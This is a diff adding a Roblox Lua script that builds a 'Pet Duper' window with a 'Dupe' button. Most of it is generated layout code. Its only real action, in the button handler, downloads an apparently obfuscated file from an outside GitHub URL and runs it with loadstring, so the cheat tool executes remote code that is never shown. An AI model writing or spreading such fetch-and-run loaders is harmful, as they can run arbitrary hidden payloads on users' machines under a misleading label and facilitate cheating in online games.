@@ -1,0 +1,85 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local Frame = Instance.new("ImageLabel")
+local Frame_2 = Instance.new("Frame")
+local TextLabel = Instance.new("ImageLabel")
+local TextButton = Instance.new("ImageButton")
+local TextLabel_2 = Instance.new("TextLabel")
+local TextLabel_3 = Instance.new("TextLabel")
+
+--Properties:
+
+Frame.Name = "Frame"
+Frame.Parent = game.StarterGui.ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
+Frame.BackgroundTransparency = 1.000
+Frame.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Frame.Position = UDim2.new(0.336098731, 0, 0.265486717, 0)
+Frame.Size = UDim2.new(0, 296, 0, 280)
+Frame.Image = "rbxassetid://3570695787"
+Frame.ImageColor3 = Color3.fromRGB(37, 37, 37)
+Frame.ScaleType = Enum.ScaleType.Slice
+Frame.SliceCenter = Rect.new(100, 100, 100, 100)
+Frame.SliceScale = 0.120
+
+Frame_2.Parent = Frame
+Frame_2.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame_2.BorderSizePixel = 0
+Frame_2.Position = UDim2.new(0.0236486495, 0, 0.0250000004, 0)
+Frame_2.Size = UDim2.new(0, 282, 0, 267)
+
+TextLabel.Name = "TextLabel"
+TextLabel.Parent = Frame_2
+TextLabel.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Size = UDim2.new(0, 282, 0, 50)
+TextLabel.Image = "rbxassetid://2790382281"
+TextLabel.ImageColor3 = Color3.fromRGB(37, 37, 37)
+TextLabel.ScaleType = Enum.ScaleType.Slice
+TextLabel.SliceCenter = Rect.new(4, 4, 252, 252)
+
+TextButton.Name = "TextButton"
+TextButton.Parent = TextLabel
+TextButton.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
+TextButton.BackgroundTransparency = 1.000
+TextButton.Position = UDim2.new(0.145390064, 0, 1.39999998, 0)
+TextButton.Size = UDim2.new(0, 200, 0, 163)
+TextButton.Image = "rbxassetid://2790382281"
+TextButton.ImageColor3 = Color3.fromRGB(37, 37, 37)
+TextButton.ScaleType = Enum.ScaleType.Slice
+TextButton.SliceCenter = Rect.new(4, 4, 252, 252)
+
+TextLabel_2.Parent = TextButton
+TextLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0.5, 0, 0.5, 0)
+TextLabel_2.Size = UDim2.new(1, 0, 0.899999976, 0)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "Dupe"
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextSize = 26.000
+
+TextLabel_3.Parent = Frame_2
+TextLabel_3.AnchorPoint = Vector2.new(0.5, 0.5)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.Position = UDim2.new(0.5, 0, 0.0917603001, 0)
+TextLabel_3.Size = UDim2.new(1, 0, 0.899999976, 0)
+TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.Text = "Pet Duper by:CGK"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextSize = 26.000
+
+-- Scripts:
+
+local function UKSEJUX_fake_script() -- TextButton.LocalScript 
+	local script = Instance.new('LocalScript', TextButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Xyokuro/Ps99AutoFarms/main/Protected_4763701070322546.txt"))()
+	end)
+end
+coroutine.wrap(UKSEJUX_fake_script)()
